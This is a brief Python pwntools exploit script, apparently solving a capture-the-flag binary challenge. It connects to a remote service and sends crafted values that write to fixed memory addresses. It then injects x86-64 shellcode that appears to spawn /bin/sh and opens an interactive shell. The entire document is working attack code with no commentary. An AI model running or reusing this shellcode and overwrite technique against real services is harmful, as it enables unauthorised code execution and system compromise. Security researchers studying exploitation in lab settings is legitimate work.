from pwn import *

#s = remote("192.168.0.12",1234)
s = remote('10.10.134.127', 30003)
s.recvuntil("Can you exploit? I think you can't")
s.sendline(str(0x601040)+'\xf6')
s.recvuntil("Can you exploit? I think you can't")
raw_input()
sc = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
s.send(str(0x601060)+"\xac"+"\x00"+sc+"A"*(0x3b-len(sc))+p32(0x0)+"\x41"*(0x5c-0x3b-4-9)+p64(0x00601060-0x38)+'\x00\x27')
s.interactive()
